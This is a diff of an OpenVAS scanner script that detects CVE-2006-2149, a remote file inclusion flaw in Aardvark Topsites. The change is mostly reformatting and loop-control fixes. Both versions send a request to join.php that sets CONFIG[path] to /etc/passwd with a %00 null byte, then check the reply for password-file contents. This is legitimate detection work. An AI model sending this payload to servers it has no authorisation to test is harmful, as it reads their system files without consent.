@@ -1,5 +1,5 @@
 # OpenVAS Vulnerability Test
-# $Id: aardvark_422_remote_file_include.nasl 3854 2016-08-18 13:15:25Z teissa $
+# $Id: aardvark_422_remote_file_include.nasl 5779 2017-03-30 06:57:12Z cfi $
 # Description: Aardvark Topsites <= 4.2.2 Remote File Inclusion Vulnerability
 #
 # Authors:
@@ -42,60 +42,57 @@ tag_solution = "Disable PHP's 'register_globals' or upgrade to the latest releas
 # Original advisory / discovered by :
 # http://milw0rm.com/exploits/1732
 
-if (description) {
- script_oid("1.3.6.1.4.1.25623.1.0.200005"); 
- script_version("$Revision: 3854 $");
- script_tag(name:"last_modification", value:"$Date: 2016-08-18 15:15:25 +0200 (Thu, 18 Aug 2016) $");
- script_tag(name:"creation_date", value:"2008-08-22 16:09:14 +0200 (Fri, 22 Aug 2008)");
- script_tag(name:"cvss_base", value:"6.4");
- script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:N");
-
- script_cve_id("CVE-2006-2149");
- script_xref(name:"OSVDB", value:"25158");
-
- script_name("Aardvark Topsites <= 4.2.2 Remote File Inclusion Vulnerability");
-
- script_category(ACT_ATTACK);
+if(description)
+{
+  script_oid("1.3.6.1.4.1.25623.1.0.200005"); 
+  script_version("$Revision: 5779 $");
+  script_tag(name:"last_modification", value:"$Date: 2017-03-30 08:57:12 +0200 (Thu, 30 Mar 2017) $");
+  script_tag(name:"creation_date", value:"2008-08-22 16:09:14 +0200 (Fri, 22 Aug 2008)");
+  script_tag(name:"cvss_base", value:"6.4");
+  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:N");
+  script_cve_id("CVE-2006-2149");
+  script_xref(name:"OSVDB", value:"25158");
+  script_name("Aardvark Topsites <= 4.2.2 Remote File Inclusion Vulnerability");
+  script_category(ACT_ATTACK);
   script_tag(name:"qod_type", value:"remote_vul");
- script_family("Web application abuses");
- script_copyright("This script is Copyright (C) 2006 Ferdy Riphagen");
-
- script_dependencies("http_version.nasl");
- script_require_ports("Services/www", 80);
- script_exclude_keys("Settings/disable_cgi_scanning");
- script_tag(name : "solution" , value : tag_solution);
- script_tag(name : "summary" , value : tag_summary);
- script_xref(name : "URL" , value : "http://secunia.com/advisories/19911/");
- script_xref(name : "URL" , value : "http://www.aardvarktopsitesphp.com/forums/viewtopic.php?t=4301");
- exit(0);
+  script_family("Web application abuses");
+  script_copyright("This script is Copyright (C) 2006 Ferdy Riphagen");
+  script_dependencies("find_service.nasl", "http_version.nasl");
+  script_require_ports("Services/www", 80);
+  script_exclude_keys("Settings/disable_cgi_scanning");
+  script_tag(name : "solution" , value : tag_solution);
+  script_tag(name : "summary" , value : tag_summary);
+  script_xref(name : "URL" , value : "http://secunia.com/advisories/19911/");
+  script_xref(name : "URL" , value : "http://www.aardvarktopsitesphp.com/forums/viewtopic.php?t=4301");
+  exit(0);
 }
 
 include("http_func.inc");
 include("http_keepalive.inc");
 
 port = get_http_port(default:80);
-if (!get_port_state(port)) exit(0);
 if (!can_host_php(port:port)) exit(0);
 
-dirs = make_list("/topsites", "/aardvarktopsites", cgi_dirs());
+foreach dir( make_list_unique( "/topsites", "/aardvarktopsites", cgi_dirs( port:port ) ) ) {
 
-foreach dir (dirs) {
- res = http_get_cache(item:string(dir, "/index.php"), port:port); 
- if(res == NULL) exit(0);
+  if( dir == "/" ) dir = "";
+  res = http_get_cache(item:string(dir, "/index.php"), port:port); 
+  if(res == NULL) continue;
 
- if (egrep(pattern:"Powered By <a href[^>]+>Aardvark Topsites PHP<", string:res)) {
-  uri = "FORM[url]=1&CONFIG[captcha]=1&CONFIG[path]=";
-  lfile = "/etc/passwd";
+  if (egrep(pattern:"Powered By <a href[^>]+>Aardvark Topsites PHP<", string:res)) {
+    uri = "FORM[url]=1&CONFIG[captcha]=1&CONFIG[path]=";
+    lfile = "/etc/passwd";
 
-  req = http_get(item:string(dir, "/sources/join.php?", uri, lfile, "%00"), port:port);
-  recv = http_keepalive_send_recv(data:req, port:port, bodyonly:TRUE);
-  
-  if (recv == NULL) exit(0);
+    req = http_get(item:string(dir, "/sources/join.php?", uri, lfile, "%00"), port:port);
+    recv = http_keepalive_send_recv(data:req, port:port, bodyonly:TRUE);
+    if (recv == NULL) continue;
 
-  if (egrep(pattern:"root:.*:0:[01]:.*:", string:recv) ||
-     egrep(pattern:"Warning.+main\(/etc/passwd\\0\/.+failed to open stream", string:recv)) { 
-   security_message(port);
-   exit(0);
-  } 
- }
+    if (egrep(pattern:"root:.*:0:[01]:.*:", string:recv) ||
+        egrep(pattern:"Warning.+main\(/etc/passwd\\0\/.+failed to open stream", string:recv)) { 
+      security_message(port:port);
+      exit(0);
+    }
+  }
 }
+
+exit( 99 );
